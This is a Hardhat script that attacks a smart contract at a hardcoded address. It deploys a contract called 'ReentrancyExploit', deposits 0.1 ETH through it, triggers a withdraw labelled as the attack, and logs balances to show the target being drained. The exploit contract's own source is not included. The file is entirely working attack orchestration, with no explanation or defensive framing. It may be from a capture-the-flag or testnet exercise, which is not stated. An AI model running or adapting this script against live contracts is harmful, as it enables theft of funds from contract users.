import { ethers } from "hardhat";

const targetContractAddress = "0x42948f4F9dc90C82D69F31E8D210AAD04459A075";

const main = async () => {
  const signer = (await ethers.getSigners())[0];
  console.log(signer.address);

  console.log("Target Contract Balance: ", ethers.formatEther(await ethers.provider.getBalance(targetContractAddress)));
  console.log("My Balance: ", ethers.formatEther(await ethers.provider.getBalance(signer.address)));

  console.log("------------------");

  const ExploitFactory = await ethers.getContractFactory("ReentrancyExploit");
  const exploit = await ExploitFactory.deploy();

  await exploit.waitForDeployment();

  console.log(`Exploit Deployed on Address: ${await exploit.getAddress()}`);

  console.log("------------------");

  console.log(`Depositing from the Exploiter`);
  const tx1 = await exploit.donate({ value: ethers.parseEther("0.1") });
  await tx1.wait();
  console.log(`Deposted`);

  console.log("Target Contract Balance: ", ethers.formatEther(await ethers.provider.getBalance(targetContractAddress)));

  console.log("------------------");

  console.log(`Initiating the Attack..`);
  const tx2 = await exploit.withdraw();
  await tx2.wait();

  console.log("Target Contract Balance: ", ethers.formatEther(await ethers.provider.getBalance(targetContractAddress)));
  console.log("Exploit Balance: ", ethers.formatEther(await ethers.provider.getBalance(await exploit.getAddress())));
  console.log("My Balance: ", ethers.formatEther(await ethers.provider.getBalance(signer.address)));
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
